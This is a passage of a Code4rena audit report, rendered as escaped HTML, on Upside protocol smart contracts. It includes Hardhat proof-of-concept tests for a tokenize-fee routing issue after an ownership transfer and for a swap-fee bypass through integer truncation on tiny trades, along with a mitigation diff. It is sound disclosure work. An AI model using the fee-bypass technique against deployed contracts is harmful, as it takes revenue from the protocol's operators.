 tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 9900,  // 99%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Owner sets the fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // set tokenize fee to 5e6\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setTokenizeFee(liquidityTokenAddress, _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint liquidityToken to user1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 received the minted tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs tokenization (url1), fee should go to current fee destination (owner)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url1, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Validate that the fee was received by the original owner\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let tokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(tokenizeFeeDestinationAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;5\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Transfer ownership to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).transferOwnership(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // asset that new ownership is assigned to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await upsideProtocol.owner()).to.be.eq(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs a second tokenization (url2) after ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url2, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that the original owner still receives the fee post-ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let currentTokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(await owner.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(currentTokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;10\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"03-swap-fee-bypass-via-small-trade-amounts\" style=\"position:relative;\"\u003e\u003ca href=\"#03-swap-fee-bypass-via-small-trade-amounts\" aria-label=\"03 swap fee bypass via small trade amounts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Swap fee bypass via small trade amounts\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eswap()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e smart contract is vulnerable to fee circumvention when users initiate swaps with extremely small input amounts. The issue stems from the use of integer division in Solidity, which truncates values. As a result, when the calculated fee amount is less than 1 (due to the small trade size), it truncates to zero, effectively bypassing the protocol’s fee logic.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isBuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @dev On buy, the dynamic time fee is used\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountAfterFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis behavior directly undermines the intended fee model, allowing users to perform token swaps without contributing any fee to the protocol. The bypass is particularly problematic given the economic incentives it creates—users could automate micro-swaps to avoid fees entirely while still draining value from the system.\u003c/p\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eNo fees are collected on small trade size.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eSet a protocol-wide minimum input amount to reject trades too small to generate fees:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require(_amount \u0026gt;= MIN_SWAP_AMOUNT, \u0026quot;Swap amount too small\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in \u003ccode\u003ePoC.test.ts\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should implement fee exemption for user1 during swap\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set up a initial swap fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 100,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 90,      // 0.9%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set fee info:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint user1 with liquidityToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify user1 received the correct liquidity token balance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Perform a swap with an extremely small input amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _tokenAmount = hhethers.parseUnits(\u0026quot;0.000099\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _tokenAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).swap(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await sampleLinkToken.getAddress(),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      _tokenAmount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await user1.getAddress()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 receives a non-zero amount of LINK tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LinkTokenBalance = await sampleLinkToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LinkTokenBalance).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check that no protocol fees were collected from the swap\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let claimableProtocolFees = await upsideProtocol.claimableProtocolFees();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(claimableProtocolFees).to.be.eq(0); // Fee bypass confirmed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues deemed invalid by the judge have been removed for reporting purposes.\u003c/em\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 